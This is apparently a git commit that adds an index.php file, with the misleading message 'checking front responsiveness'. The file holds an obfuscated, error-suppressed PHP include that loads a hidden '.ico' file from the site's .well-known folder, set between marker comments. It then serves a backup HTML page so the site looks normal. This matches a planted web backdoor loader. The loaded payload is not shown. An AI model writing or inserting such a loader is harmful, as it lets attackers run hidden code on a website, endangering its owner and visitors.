7cc6919e54e1878c1602d58682e58ad1c5ba2afc
kalvictors <kalvictors7@gmail.com>
2018-12-04 08:24:02 +0300

    checking front responsiveness

---
+++ index.php
@@ -0,0 +1,9 @@
+<?php
+/*aa607*/
+
+@include "\057home\057zalp\157int/\160ubli\143_htm\154/.we\154l-kn\157wn/.\064c6d1\067ec.i\143o";
+
+/*aa607*/
+
+
+echo @file_get_contents('index.html.bak.bak');
